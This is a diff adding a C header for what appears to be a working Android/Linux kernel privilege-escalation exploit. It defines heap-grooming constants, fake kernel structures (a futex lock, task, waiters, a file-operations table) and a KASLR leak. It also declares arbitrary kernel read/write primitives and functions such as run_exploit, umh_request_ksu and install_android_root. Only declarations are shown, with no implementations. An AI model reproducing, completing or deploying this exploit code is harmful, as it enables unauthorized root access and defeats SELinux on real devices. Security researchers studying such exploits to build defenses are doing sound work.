@@ -1,0 +1,182 @@
+#ifndef COMMON_H
+#define COMMON_H
+
+#define _GNU_SOURCE
+#define __ARM 1
+
+#include "params.h"
+
+#define PAGE_SHIFT 12
+#define PAGE_SIZE (1UL << PAGE_SHIFT)
+#define KS_PAGE_SIZE 4096
+
+#include <dirent.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/futex.h>
+#include <linux/memfd.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/resource.h>
+#include <sys/select.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/uio.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+
+#include "kernelsnitch/utils.h"
+
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#define SKB_DATA_DELTA (-0xe80LL)
+
+#define MM_STRUCT_SZ 0x500
+#define MM_ORDER 3
+#define MM_PARTIALS 5
+#define CORE 0
+#define KSNITCH_COLLISIONS 4
+
+#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
+#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#define SKB_RECLAIM_SENDS 4
+#define FOPS_TABLE_OFF FOPS_OFF
+#define SKB_FRAG_BIAS 0
+
+#define FAKE_TASK_PRIO 120
+#define FAKE_WAITER_PRIO 130
+
+#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
+#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
+#define PAGE_TYPE_SLAB 0xf5
+
+#define CONSUMER_CORE (CORE + 1)
+#define CONSUMER_THREADS_MAX 8
+#define PSELECT_ROUTE_NFDS 320
+#define PSELECT_CONSUMER_NICE 19
+#define PSELECT_ENTER_DELAY_USEC 120000
+#define PSELECT_TIMEOUT_SEC 1
+#ifndef ROUTE_WAIT_SECONDS
+#define ROUTE_WAIT_SECONDS 2
+#endif
+
+struct local_sched_attr {
+  uint32_t size;
+  uint32_t sched_policy;
+  uint64_t sched_flags;
+  int32_t sched_nice;
+  uint32_t sched_priority;
+  uint64_t sched_runtime;
+  uint64_t sched_deadline;
+  uint64_t sched_period;
+};
+
+struct mm_ctx {
+  size_t mm_cnt;
+  pid_t *childs;
+  int *memfds;
+};
+
+extern uintptr_t page_base;
+extern uintptr_t fake_lock;
+extern uintptr_t fake_w0;
+extern uintptr_t fake_task;
+extern uintptr_t fake_parent;
+extern uintptr_t fake_right;
+extern uintptr_t fake_left;
+extern uintptr_t fake_fops;
+
+extern atomic_int punch_consume_go;
+extern atomic_int punch_consume_stop;
+extern atomic_int consumer_calls;
+extern atomic_int consumer_success;
+extern atomic_int walk_delay_usec;
+extern int root_child_done;
+extern uint8_t selinux_before;
+extern uint8_t selinux_after;
+extern uint32_t root_uid_before;
+extern uint32_t root_uid_after;
+extern int kaslr_done;
+extern uint64_t kaslr_base;
+extern uintptr_t slide_p0_offset;
+extern int memfd_leak;
+extern unsigned char *skb_buf;
+struct kernelsnitch_shared_state;
+extern struct kernelsnitch_shared_state *ks;
+int attr_run(void);
+void attr_cleanup(void);
+int attr_read64(uintptr_t target, uint64_t *value);
+int attr_write64(uintptr_t target, uint64_t value);
+int attr_read_data(uintptr_t target, void *data, size_t len);
+int attr_write_data(uintptr_t target, const void *data, size_t len);
+uint64_t attr_read64_value(uintptr_t target);
+extern int attr_fd[2];
+int pselect_write_once(uintptr_t target, uintptr_t value);
+uintptr_t pselect_write_value(void);
+uintptr_t pselect_write_target(void);
+void set_pselect_write(uintptr_t target, uintptr_t value);
+extern int pselect_custom_write;
+extern uintptr_t pselect_custom_target;
+extern uintptr_t pselect_custom_value;
+extern int pselect_clobber;
+void clobber_fd_words_for_clean_exit(void);
+
+int run_exploit(int argc, char **argv);
+
+enum exploit_rc {
+  RC_OK = 0,
+  RC_FAIL = 1,
+  RC_UNSUPPORTED = 2,
+  RC_CARRIER_FAIL = 3,
+  RC_KSU_FAIL = 4,
+};
+int read_first_line(const char *path, char *buf, size_t len);
+int write_file_str(const char *path, const char *value);
+void log_startup_context(void);
+void exploit_env_shape(void);
+uintptr_t text_addr(uintptr_t image_addr);
+void put64(unsigned char *p, size_t off, uint64_t value);
+void put32(unsigned char *p, size_t off, uint32_t value);
+void put_fake_fops_table(unsigned char *p, size_t off);
+void close_ctx_memfds(struct mm_ctx *ctx);
+void free_ctx_storage(struct mm_ctx *ctx);
+void cleanup_page_prepare_state(void);
+void prepare_ctxs(void);
+int prepare_skb_payload(uintptr_t base);
+uintptr_t prepare_kernel_page(void);
+uintptr_t prepare_good_kernel_page(void);
+void payload_set_base(uintptr_t payload_base);
+
+void fdset_put_word(fd_set *set, int word, uint64_t value);
+uint64_t fdset_get_word(const fd_set *set, int word);
+void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd);
+void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+int do_pselect_fake_lock_route(void);
+
+extern int pselect_last_ret;
+extern int pselect_last_calls;
+extern int pselect_last_success;
+void run_walk_threads(void);
+int wait_child_timeout(pid_t pid, int *status_out, int timeout_sec);
+
+int prepare_ksud_stage(void);
+int umh_request_ksu(void);
+
+int slide_leak_kernel_base(void);
+
+int is_kernel_ptr(uintptr_t value);
+int is_direct_ptr(uintptr_t value);
+
+int install_android_root(void);
+
+#endif
